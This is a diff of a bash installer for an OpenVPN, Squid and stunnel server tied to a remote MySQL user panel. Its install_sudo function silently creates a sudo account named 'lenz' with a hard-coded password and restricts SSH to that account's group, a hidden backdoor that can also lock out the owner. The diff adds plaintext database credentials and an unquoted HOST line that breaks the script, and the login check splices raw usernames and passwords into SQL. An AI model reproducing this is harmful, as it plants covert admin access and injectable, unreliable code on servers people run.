@@ -1,10 +1,13 @@
 #!/bin/bash
+#Script Variables
+HOST='66.45.249.83;
+USER='smart444_goldvip';
+PASS='smart444_goldvip';
+DBNAME='smart444_goldvip';
+PORT_TCP='1194';
+PORT_UDP='53';
+
 cp /usr/share/zoneinfo/Asia/Riyadh /etc/localtime
-#Database Details
-HOST='49.12.80.157';
-USER='goldvip_smartpanel';
-PASS='goldvip_smartpanel';
-DBNAME='goldvip_smartpanel';
 
 install_require()
 {
@@ -51,24 +54,17 @@ sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3
 # Default-Stop:      0 1 6
 # Short-Description: Squid HTTP Proxy version 3.x
 ### END INIT INFO
-
 NAME=squid3
 DESC="Squid HTTP Proxy"
 DAEMON=/usr/sbin/squid3
 PIDFILE=/var/run/$NAME.pid
 CONFIG=/etc/squid3/squid.conf
 SQUID_ARGS="-YC -f $CONFIG"
-
 [ ! -f /etc/default/squid ] || . /etc/default/squid
-
 . /lib/lsb/init-functions
-
 PATH=/bin:/usr/bin:/sbin:/usr/sbin
-
 [ -x $DAEMON ] || exit 0
-
 ulimit -n 65535
-
 find_cache_dir () {
 	w=" 	" # space tab
         res=`$DAEMON -k parse -f $CONFIG 2>&1 |
@@ -82,7 +78,6 @@ find_cache_dir () {
         [ -n "$res" ] || res=$2
         echo "$res"
 }
-
 grepconf () {
 	w=" 	" # space tab
         res=`$DAEMON -k parse -f $CONFIG 2>&1 |
@@ -96,12 +91,10 @@ grepconf () {
 	[ -n "$res" ] || res=$2
 	echo "$res"
 }
-
 create_run_dir () {
 	run_dir=/var/run/squid3
 	usr=`grepconf cache_effective_user proxy`
 	grp=`grepconf cache_effective_group proxy`
-
 	if [ "$(dpkg-statoverride --list $run_dir)" = "" ] &&
 	   [ ! -e $run_dir ] ; then
 		mkdir -p $run_dir
@@ -109,17 +102,14 @@ create_run_dir () {
 		[ -x /sbin/restorecon ] && restorecon $run_dir
 	fi
 }
-
 start () {
 	cache_dir=`find_cache_dir cache_dir`
 	cache_type=`grepconf cache_dir`
 	run_dir=/var/run/squid3
-
 	#
 	# Create run dir (needed for several workers on SMP)
 	#
 	create_run_dir
-
 	#
 	# Create spool dirs if they don't exist.
 	#
@@ -129,7 +119,6 @@ start () {
 		$DAEMON -z -f $CONFIG
 		[ -x /sbin/restorecon ] && restorecon -R $cache_dir
 	fi
-
 	umask 027
 	ulimit -n 65535
 	cd $run_dir
@@ -138,7 +127,6 @@ start () {
 		--exec $DAEMON -- $SQUID_ARGS < /dev/null
 	return $?
 }
-
 stop () {
 	PID=`cat $PIDFILE 2>/dev/null`
 	start-stop-daemon --stop --quiet --pidfile $PIDFILE --exec $DAEMON
@@ -167,14 +155,12 @@ stop () {
 		return 0
 	fi
 }
-
 cfg_pidfile=`grepconf pid_filename`
 if test "${cfg_pidfile:-none}" != "none" -a "$cfg_pidfile" != "$PIDFILE"
 then
 	log_warning_msg "squid.conf pid_filename overrides init script"
 	PIDFILE="$cfg_pidfile"
 fi
-
 case "$1" in
     start)
 	res=`$DAEMON -k parse -f $CONFIG 2>&1 | grep -o "FATAL: .*"`
@@ -236,7 +222,6 @@ case "$1" in
 	exit 3
 	;;
 esac
-
 exit 0
 EOM
 
@@ -290,7 +275,7 @@ sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
 echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
-port 53
+port PORT_UDP
 proto udp
 topology subnet
 server 10.30.0.0 255.255.252.0
@@ -331,11 +316,14 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
-verb 3' > /etc/openvpn/server.conf
+verb 3
+duplicate-cn' > /etc/openvpn/server.conf
+
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
 echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
-port 1194
+port PORT_TCP
 proto tcp
 topology subnet
 server 10.20.0.0 255.255.252.0
@@ -376,7 +364,10 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
-verb 3' > /etc/openvpn/server2.conf
+verb 3
+duplicate-cn' > /etc/openvpn/server2.conf
+
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
 
 cat <<\EOM >/etc/openvpn/login/config.sh
 #!/bin/bash
@@ -394,7 +385,7 @@ sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 /bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
 #!/bin/bash
 . /etc/openvpn/login/config.sh
-Query="SELECT user_name FROM users WHERE user_name='$username' AND user_encryptedPass=md5('$password') AND is_freeze='0' AND user_duration > 0"
+Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND is_freeze='0' AND duration > 0"
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
 EOM
@@ -402,22 +393,18 @@ EOM
 #client-connect file
 cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
-
 . /etc/openvpn/login/config.sh
-
 ##set status online to user connected
 server_ip=$(curl -s https://api.ipify.org)
 datenow=`date +"%Y-%m-%d %T"`
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
 LENZ05
 
 #TCP client-disconnect file
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
-
 . /etc/openvpn/login/config.sh
-
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='0', active_address='', active_date='' WHERE user_name='$common_name' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
 LENZ06
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
@@ -472,7 +459,6 @@ Certificate:
                 keyid:64:49:32:6F:FE:66:62:F1:57:4D:BB:91:A8:5D:BD:26:3E:51:A4:D2
                 DirName:/CN=KobZ
                 serial:01:A4:01:02:93:12:D9:D6:01:A9:83:DC:03:73:DA:ED:C8:E3:C3:B7
-
             X509v3 Extended Key Usage: 
                 TLS Web Server Authentication
             X509v3 Key Usage: 
@@ -597,16 +583,16 @@ enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
 echo "debug = 0
 output = /tmp/stunnel.log
 cert = /etc/stunnel/stunnel.pem
-
 [openvpn-tcp]
-connect = 1194  
+connect = PORT_TCP  
 accept = 443 
-
 [openvpn-udp]
-connect = 53
+connect = PORT_UDP
 accept = 444
 " >> stunnel.conf
 
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/stunnel/stunnel.conf
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/stunnel/stunnel.conf
 cd /etc/default && rm stunnel4
 
 echo 'ENABLED=1
@@ -622,9 +608,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m azim 2>/dev/null; echo azim:@@MDAzim@@ | chpasswd &>/dev/null; usermod -aG sudo azim &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups azim" >> /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -703,8 +689,8 @@ install_done()
   clear
   echo "OPENVPN SERVER FIRENET"
   echo "IP : $(curl -s https://api.ipify.org)"
-  echo "OPENVPN TCP port : 1194"
-  echo "OPENVPN UDP port : 53"
+  echo "OPENVPN TCP port : $PORT_TCP"
+  echo "OPENVPN UDP port : $PORT_UDP"
   echo "OPENVPN SSL port : 443"
   echo "SOCKS port : 80"
   echo "PROXY port : 3128"
